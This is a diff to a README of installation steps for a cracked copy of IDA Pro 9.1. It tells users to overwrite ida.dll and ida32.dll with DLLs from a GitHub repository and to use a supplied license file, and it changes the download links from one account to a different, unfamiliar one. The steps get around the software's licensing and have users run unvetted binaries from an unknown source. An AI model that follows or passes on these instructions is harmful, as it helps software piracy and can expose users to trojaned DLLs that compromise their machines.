@@ -12,10 +12,10 @@
    C:\Program Files\IDA Professional 9.1
    ```
 3. Replace the existing `ida.dll` and `ida32.dll` with:
-   - [ida.dll](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida.dll)
-   - [ida32.dll](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida32.dll)
+   - [ida.dll](https://github.com/eyeschicotheyneverlie/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida.dll)
+   - [ida32.dll](https://github.com/eyeschicotheyneverlie/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida32.dll)
 4. Use the license file:
-   - [idapro.hexlic](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/idapro.hexlic)
+   - [idapro.hexlic](https://github.com/eyeschicotheyneverlie/IDA-Pro-9.1/blob/main/other%20files%20you%20need/idapro.hexlic)
 
 ---
 
